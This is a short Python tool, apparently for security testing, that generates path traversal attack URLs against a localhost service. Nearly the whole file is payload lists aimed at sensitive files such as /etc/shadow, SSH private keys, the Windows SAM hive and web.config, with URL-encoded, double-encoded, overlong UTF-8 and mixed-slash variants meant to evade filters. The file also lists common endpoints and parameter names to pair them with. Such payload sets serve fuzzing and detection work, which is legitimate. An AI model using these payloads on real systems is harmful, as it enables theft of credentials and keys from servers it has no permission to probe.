"""
tools/pathT_atk.py — Path Traversal attack payload generator
"""
import random

_LINUX_BASIC = [
    "../../../../etc/passwd",
    "../../../etc/passwd",
    "../../../../../../etc/shadow",
    "../../../../proc/self/environ",
    "../../../../var/log/auth.log",
    "../../../../home/user/.ssh/id_rsa",
]

_WINDOWS_BASIC = [
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "..\\..\\..\\boot.ini",
    "..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\inetpub\\wwwroot\\web.config",
    "../../../../Windows/System32/config/SAM",
]

_URL_ENCODED = [
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252fetc%252fpasswd",  # double-encoded
    "..%c0%af..%c0%afetc%c0%afpasswd",  # overlong UTF-8
    "%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
]

_MIXED_SLASHES = [
    "..\\/../etc/passwd",
    "..\\/..\\/../etc/passwd",
    "....//....//etc/passwd",
    "....\\\\....\\\\etc\\\\passwd",
]

_ABSOLUTE = [
    "/etc/passwd",
    "/etc/shadow",
    "/proc/version",
    "C:\\Windows\\win.ini",
    "/var/www/html/config.php",
]

ALL_PAYLOADS = _LINUX_BASIC + _WINDOWS_BASIC + _URL_ENCODED + _MIXED_SLASHES + _ABSOLUTE

PT_PATHS  = ["/files", "/static", "/assets", "/download", "/images", "/docs", "/view"]
PT_PARAMS = ["path", "file", "dir", "folder", "resource", "img", "doc"]


def generate() -> tuple[str, str]:
    payload = random.choice(ALL_PAYLOADS)
    path    = random.choice(PT_PATHS)
    param   = random.choice(PT_PARAMS)
    url     = f"http://localhost:8000{path}?{param}={payload}"
    return url, payload
